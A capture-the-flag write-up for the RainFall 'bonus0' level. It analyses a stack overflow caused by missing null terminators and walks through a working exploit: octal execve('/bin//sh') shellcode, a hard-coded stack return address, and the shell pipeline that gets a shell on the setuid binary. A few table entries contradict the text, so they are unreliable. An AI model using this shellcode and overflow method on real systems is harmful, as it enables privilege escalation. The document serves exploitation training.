# RainFall (bonus0)

In this project, we try to **exploit binaries** with the intent of reading the `/home/users/level<n+1>/.pass` file, containing our flag serving as the password for the next level.

# Binary

Binary properties:
- Full path: `/home/user/bonus0/bonus0`
- Type: **ELF 32-bit LSB executable** (`file -b ~/bonus0`)

To analyze its content we generated two files:
- [source.c](./source.c): generated with our [ghidra.sh](../common/ghidra/ghidra.sh), wrapping a [Ghidra](https://github.com/nationalsecurityagency/ghidra)-based [docker container](https://hub.docker.com/r/blacktop/ghidra).
- [source.asm](./source.asm): trimmed after being generated through `objdump -D ~/bonus0`.

# Security

Let's connect to the server through [ssh](./Ressources/ssh.sh) and inspect the protections in place.

## File Attributes

```sh
$ ls -la ~/bonus0
-rwsr-s---+ 1 bonus1 users 5566 Mar  6  2016 /home/user/bonus0/bonus0
```

These describe the binary's privileges.
|    Attribute    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|    Suid bit     |    ✅     | Runs with bonus1's effective id: opening a shell inherits it.


## Compile-Time

```sh
$ checksec --file ~/bonus0
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
```

These are the protections baked directly into the binary.
|   Protection    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|      RELRO      |    ❌     | GOT is writable.
|  Stack Canary   |    ❌     | Stack buffer overflows are possible.
|       NX        |    ❌     | Stack/Heap are nonexecutable. Shellcode injection is possible.
|       PIE       |    ❌     | The stack's position is predictable.
| RPATH / RUNPATH |    ❌     | No custom library search path to hijack.

## Kernel Run-Time

```sh
$ cat /proc/sys/kernel/randomize_va_space
0
```

These are the protections baked directly into the binary.
|   Protection    |   State   |                           Meaning for us                           |
|       ---       |    ---    |                                ---                                 |
|      ASLR       |    ❌     | Stack and heap addresses are stable across runs.

## Documentation

Reference material for the concepts above:
- Setuid flag (Suid): https://fr.wikipedia.org/wiki/Setuid
- Relocation Read-Only (RELRO): https://ctf101.org/binary-exploitation/relocation-read-only/
- Stack canary: https://ctf101.org/binary-exploitation/stack-canaries/
- No eXecute (NX): https://ctf101.org/binary-exploitation/no-execute/
- Position Independent Code (PIE): https://en.wikipedia.org/wiki/Position-independent_code
- RUNPATH & RPATH: https://en.wikipedia.org/wiki/Rpath
- Address Space Layout Randomization (ASLR): https://ctf101.org/binary-exploitation/address-space-layout-randomization/

## Discovered vulnerability

The decompiled binary (cf. [source](source.c)) is subject to two cases of "Improper Null Termination" ([CWE-170](https://cwe.mitre.org/data/definitions/170.html)). 
Functions such as `read()` and `strncpy()` do not enforce the presence of a null terminator. This introduces **stack-overflow** opportunities when handling user-controlled input.

In parallel, the kernel and binary do not implement modern security practices such as the *(No-eXecute bit)* that would make it harder to exploit.

## Vulnerability analysis

Analysing the [source](source.c) and experimenting, we established the following.

1. `p()` reads user input and copies **exactly 20 bytes** into its target buffer. Due to the used functions and the structure of the code, when **exactly 20 bytes** are provided, with no `'\n'` or `'\0'`, the final buffer will not be terminated by a null byte terminator.
2. `pp()` declares two contiguous 20-byte buffers and fills each one through a call to `p()`. By exploiting `p()`'s vulnerability and removing the null byte terminator between these two contiguous buffers, it allows functions such as `strcpy()` to interpret it as a 40-byte long buffer. This leads to writes of unintended sizes to the provided buffer.
3. `main()` calls `pp()` to fill its buffer (reconstructed as `char[54]` by Ghidra in [source.c](source.c)) and then print it. By exploiting `pp()`'s vulnerability, it is possible to write more bytes than the buffer can hold. Roughly **54 bytes** (alignment-dependent, 46–61) separate the buffer's start from `main()`'s saved return address (the buffer, the `and esp,0xfffffff0` alignment padding, and the saved `EBP` stacked above it), so overrunning that distance causes a buffer overflow that overwrites the return address.

### Stack

`p()` is the function that actually reads user input, so let's start with its stack frame.
Its stack frame should resemble something like this:
```ruby
      HIGHER MEMORY ADDRESSES     
|   prompt (pp passed arg nº2)   | (4 bytes)
+--------------------------------+
|    dest (pp passed arg nº1)    | (4 bytes)
+--------------------------------+
|        p's return address      | (4 bytes)
+--------------------------------+ <--- p's Stack Frame start (@ 0xbffffdcc)
|   caller's stack base pointer  | (4 bytes)
+--------------------------------+ <--- p's local variables start (EBP: @ 0xbffffdc8)
| |  unused/align | (8 bytes)    |
| +---------------+ (0xbffffdc0) |
| |               |              |
| |               |              |
| |               |              |
| |     buffer    | (4096 bytes) |
| |               |              |
| |               |              | (4120 bytes)
| |               |              |
| +---------------+ (0xbfffedc0) |
| |  unused/align | (4 bytes)    |
| +---------------+ (0xbfffedbc) |
| |               |              |
| |      args     | (12 bytes)   |
| |               |              |
+--------------------------------+ <--- p's Stack Pointer (ESP: @ 0xbfffedb0)
      LOWER MEMORY ADDRESSES      
```

Let's continue with the `pp()` function's memory layout as it is where the stack overflow starts.
Its stack frame should resemble something like this:
```ruby
      HIGHER MEMORY ADDRESSES     
|     dest (main passed arg)     | (4 bytes)
+--------------------------------+
|       pp's return address      | (4 bytes)
+--------------------------------+ <--- pp's Stack Frame start (@ 0xbffffe2c)
|   caller's stack base pointer  | (4 bytes)
+--------------------------------+ <--- pp's local variables start (EBP: @ 0xbffffe28)
| |  caller's edi | (4 bytes)    |
| +---------------+              |
| |  caller's ebx | (4 bytes)    |
| +---------------+              |
| |               |              |
| |  user_input_2 | (20 bytes)   |
| |     buffer    |              |
| +---------------+ (0xbffffe0c) |
| |               |              |
| |  user_input_1 | (20 bytes)   |
| |     buffer    |              | (88 bytes)
| +---------------+ (0xbffffdf8) |
| |  unused/align | (8 bytes)    |
| +---------------+              |
| |       i       | (4 bytes)    |
| +---------------+              |
| |  unused/align | (20 bytes)   |
| +---------------+ (0xbffffdd8) |
| |    arg nº2    | (4 bytes)    |
| +---------------+              |
| |    arg nº1    | (4 bytes)    |
+--------------------------------+ <--- pp's Stack Pointer (ESP: @ 0xbffffdd0)
      LOWER MEMORY ADDRESSES      
```

Since `pp()` writes directly to the pointer passed by `main()`, the buffer overflow affects `main()`'s stack frame.
`main()`'s stack frame should resemble something like this:
```ruby
      HIGHER MEMORY ADDRESSES     
| |      ...      |              |
| +---------------+              |
| |     envp      | (4 bytes)    |
| |      []       |              |
| +---------------+              |
| |      argv     | (4 bytes)    |
| |  ['./bonus0'] |              |
| +---------------+              |
| |      argc     | (4 bytes)    |
+--------------------------------+
|      main's return address     | (4 bytes)
+--------------------------------+ <--- main's Stack Frame start (@ 0xbffffe7c)
|   caller's stack base pointer  | (4 bytes)
+--------------------------------+ <--- main's local variables start (EBP: @ 0xbffffe78)
| |  unused/align | (4 bytes)    |
| +---------------+ (0xbffffe74) |
| |               |              |
| |     buffer    | (46 bytes)   |
| |               |              | (68 bytes)
| +---------------+ (0xbffffe46) |
| |  unused/align | (18 bytes)   |
| +---------------+              |
| |    arg nº1    | (4 bytes)    |
+--------------------------------+ <--- main's Stack Pointer (ESP: @ 0xbffffe30)
      LOWER MEMORY ADDRESSES      
```

### Intent

On this binary, a lot of security features are missing:
- No eXecute bit (the stack is executable).
- No ASLR (stack addresses are predictable, not randomized).
- No stack canaries.
So addresses are predictable and code placed on the stack can be executed.

The chain leading to the buffer overflow lets us write just some extra bytes (8 in current circumstances). That's just enough to overwrite `main()`'s saved return address. But this is nowhere near the ~25 bytes range needed for our malicious shellcode (as seen in previous exercises). The shellcode must therefore live elsewhere on the stack.

`main()`'s own buffer is a poor host for the shellcode due to the different conditions we meet: the concatenation that appends a whitespace and the fact that part of our input is duplicated by the overflow process.

`p()`, by contrast, allows us to write 4096 bytes into a buffer filled by `read()` where only the 20 first bytes are actually copied out. The stack frame does not grow much above that buffer, so it is never fully overwritten by the shallower `pp()`/`main()` frames, and we can take advantage of that. The only condition is to inject the shellcode on the last call of `p()`.

## Exploit

### Payload template

Based on the discovered vulnerabilities, let's first build a payload and define a strategy to reliably overwrite `main()`'s return address.

`main()`'s buffer allows us to write up to 46 bytes safely. But due to the buffer overflow exploit, up to 62 bytes.
Assuming a buffer overflow:
- `main()`'s buffer allows us to overwrite the **caller's stack base pointer *(4 bytes)*** from its 50th byte. 
- `main()`'s buffer allows us to overwrite the **main()'s return address *(4 bytes)*** from its 54th byte. 
```sh
malicious_return_address='\220\220\220\220';    # per example: 4 NOP bytes.
up_to_4075_more_bytes='...';                    # Arbitrary amount of bytes. Can be 0.
$ (printf '%b\n' 'AAAAAAAAAAAAAAAAAAAA'; sleep 1.0; printf '%b\n' "BBBBBBBBB${malicious_return_address}BBBBBBB${up_to_4075_more_bytes}") | env -i ./bonus0
 - 
 - 
AAAAAAAAAAAAAAAAAAAABBBBBBBBB����BBBBBBB��� BBBBBBBBB����BBBBBBB���
Segmentation fault (core dumped)
```

### Shellcode

When `main()` exits, we want to redirect execution to the raw assembly code we injected (shellcode).
Thus, we need to generate the actual shellcode and inject it in `p()`'s `read()` buffer (which is wide enough and unlikely to get overwritten by future function calls).

Building a shellcode byte sequence manually (as an **little-endian octal** encoded string) is too error-prone. Instead, we generate it from an assembled binary based on the following [exploit.asm](./Ressources/data/exploit.asm) script.
```sh
$ tmpdir=$(mktemp -d);
$ asm_payload_filepath="./data/exploit.asm";

# Compile the assembly program to an object file.
$ nasm -f elf32 "$asm_payload_filepath" -o "$tmpdir/exploit.o";

# Link the object file into a binary.
$ ld -m elf_i386 -e _start "$tmpdir/exploit.o" -o "$tmpdir/exploit.bin";

# Extract the content of the ELF .text section as raw bytes.
$ objcopy -j .text -O binary "$tmpdir/exploit.bin" "$tmpdir/shellcode.bin";

# Format the bytes into an octal shellcode payload.
# We use octal because dash's printf implementation does not support the '\xHH' escape format.
$ octal_shellcode=$(hexdump -v -e '"\\" 1/1 "%03o"' "$tmpdir/shellcode.bin");
\061\300\120\150\156\057\163\150\150\057\057\142\151\211\343\120\123\211\341\061\322\260\013\315\200
$ octal_shellcode_byte_length=$(printf "%b" "$octal_shellcode" | wc -c);
25
```

### Shellcode injection

We can inject the shellcode past the 20 first bytes that are copied out by the `p()` function.  
These bytes remain in `p()`'s `read()` buffer until overwritten, so the shellcode must be passed in the payload of the **last** `p()` call.

First let's express that behaviour with an example:
```sh
shellcode=$(generate_shellcode);    # '\061\300\120\150\156\057\163\150\150\057\057\142\151\211\343\120\123\211\341\061\322\260\013\315\200'
shellcode_addr='???';               # 4 bytes.
$ (printf '%b' 'AAAAAAAAAAAAAAAAAAAA\n'; sleep 1.0; printf '%b' "BBBBBBBBB${shellcode_addr}BBBBBBB${shellcode}\n") | env -i ./bonus0
```

From here, we need the address the return address should point to: the address of the shellcode on the stack.

The shellcode does **not** live in `main()`'s buffer. It sits in the 4096-byte `read()` buffer of `p()`, right after the 20 bytes that `strncpy()` copies out. Because this buffer is deep inside `p()`'s frame, the shallower `pp()` and `main()` frames never overwrite it, and with ASLR disabled its address is identical on every run.

The shellcode therefore starts at `buffer (0xbfffedc0) + 20 (0x14)` during the **last** `p()` call:
- Its address is `0xbfffedd4`  
- In **little-endian hex** escape sequence: `\xd4\xed\xff\xbf`.  
- In **little-endian oct** escape sequence: `\324\355\377\277`.  

This address is written at bytes 9-12 of the second input, so that once the overflow walks through the two contiguous buffers it overwrites `main()`'s saved return address with it.


### Result

```sh
shellcode=$(generate_shellcode);    # '\061\300\120\150\156\057\163\150\150\057\057\142\151\211\343\120\123\211\341\061\322\260\013\315\200'
shellcode_addr='\324\355\377\277';  # 4 bytes
$ (printf '%b' 'AAAAAAAAAAAAAAAAAAAA\n'; sleep 1.0; printf '%b' "BBBBBBBBB${shellcode_addr}BBBBBBB${shellcode}\n"; cat -) | env -i ./bonus0
```

From there, we can open the  `/home/user/bonus1/.pass` file.
